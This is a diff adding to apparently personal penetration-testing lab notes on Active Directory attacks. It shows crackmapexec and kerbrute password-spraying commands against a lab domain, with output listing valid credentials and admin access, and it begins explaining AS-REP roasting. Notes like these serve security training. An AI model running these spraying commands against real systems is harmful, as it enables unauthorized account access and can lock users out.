@@ -255,3 +255,98 @@ PS Script which uses the above ^ abilities to enumerate all users and performs a
 	- Quite slow
 
 ### crackmapexec
+- Has multiple protocols with which to attack from
+- Will show if user has admin privs on the target
+- Doesn't examine the password policy of the domain before spraying
+	- Be careful about account lockout
+
+
+- Using a user list of `dave`, `jen`, `pete`, attempt to find valid creds
+```bash
+crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+	SMB         192.168.217.75  445    CLIENT75         [*] Windows 11 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
+	SMB         192.168.217.75  445    CLIENT75         [-] corp.com\dave:Nexus123! STATUS_LOGON_FAILURE 
+	SMB         192.168.217.75  445    CLIENT75         [+] corp.com\jen:Nexus123! 
+	SMB         192.168.217.75  445    CLIENT75         [+] corp.com\pete:Nexus123!
+
+
+crackmapexec smb 192.168.217.75 -u dave -p 'Flowers1' -d corp.com
+	SMB         192.168.217.75  445    CLIENT75         [*] Windows 11 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
+	SMB         192.168.217.75  445    CLIENT75         [+] corp.com\dave:Flowers1 (Pwn3d!)
+
+
+
+crackmapexec smb 192.168.217.70-76 -u pete -p 'Nexus123!' -d corp.com --continue-on-success
+	SMB         192.168.217.75  445    CLIENT75         [*] Windows 11 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
+	SMB         192.168.217.76  445    CLIENT76         [*] Windows 10 / Server 2016 Build 16299 x64 (name:CLIENT76) (domain:corp.com) (signing:False) (SMBv1:False)
+	SMB         192.168.217.74  445    CLIENT74         [*] Windows 11 Build 22000 x64 (name:CLIENT74) (domain:corp.com) (signing:False) (SMBv1:False)
+	SMB         192.168.217.73  445    FILES04          [*] Windows Server 2022 Build 20348 x64 (name:FILES04) (domain:corp.com) (signing:False) (SMBv1:False)
+	SMB         192.168.217.70  445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:corp.com) (signing:True) (SMBv1:False)
+	SMB         192.168.217.72  445    WEB04            [*] Windows Server 2022 Build 20348 x64 (name:WEB04) (domain:corp.com) (signing:False) (SMBv1:False)
+	SMB         192.168.217.75  445    CLIENT75         [+] corp.com\pete:Nexus123! 
+	SMB         192.168.217.76  445    CLIENT76         [+] corp.com\pete:Nexus123! (Pwn3d!)
+	SMB         192.168.217.74  445    CLIENT74         [+] corp.com\pete:Nexus123! 
+	SMB         192.168.217.73  445    FILES04          [+] corp.com\pete:Nexus123! 
+	SMB         192.168.217.70  445    DC1              [+] corp.com\pete:Nexus123! 
+	SMB         192.168.217.72  445    WEB04            [+] corp.com\pete:Nexus123!
+```
+	- --continue-on-success - Avoid stopping at the first valid cred
+	- `+` or `-` Indicates validity of creds
+	- (Pwn3d!) - Indicates they have admin privs on the target
+
+
+## TGT
+
+### kinit
+- Use on Linux
+- Can obtain & cache a Kerberos TGT
+- Need to provide a uname & pw
+	- If creds are valid, will obtain TGT
+- Advantage:
+	- Only uses 2 UDP frames to determine validity
+		- Sends only AS-REQ & examines response.
+- Can use Bash to automate
+
+
+### kerbrute
+- Cross platform
+
+- Using same unames in a .txt file as earlier (ANSI encoded), spray the domain
+```powershell
+.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\users.txt "Nexus123!"
+	    __             __               __
+	   / /_____  _____/ /_  _______  __/ /____
+	  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+	 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+	/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+	
+	Version: v1.0.3 (9dad6e1) - 08/10/24 - Ronnie Flathers @ropnop
+	
+	2024/08/10 19:10:52 >  Using KDC(s):
+	2024/08/10 19:10:52 >   dc1.corp.com:88
+	2024/08/10 19:10:52 >  [+] VALID LOGIN:  jen@corp.com:Nexus123!
+	2024/08/10 19:10:52 >  [+] VALID LOGIN:  pete@corp.com:Nexus123!
+	2024/08/10 19:10:52 >  Done! Tested 3 logins (2 successes) in 0.051 seconds
+```
+
+
+# AS-REP Roasting
+
+As mentioned, when requesting auth:
+
+AS-REQ is sent and an AS-REP containing the session key and TGT is sent back by the DC if the creds are valid.
+- aka `Kerberos preauthorization`
+- Prevents offline password guessing
+- w/o, attacker could send an AS-REQ to DC on behalf of any user.
+
+After obtaining the AS-REP from the DC, however, an attacker could perform an offline attack against the encrypted part of the response.
+- aka `AS-REP Roasting`
+
+> AD user account option is set to _Do not require Kerberos preauthentication_ - disabled by default
+	- Kerberos preauth is performed for all users
+	- Possible to enable this account option manually
+	- May be enabled as some apps and techs require it to function normally
+
+
+## impacket-GetNPUsers
+- Linux
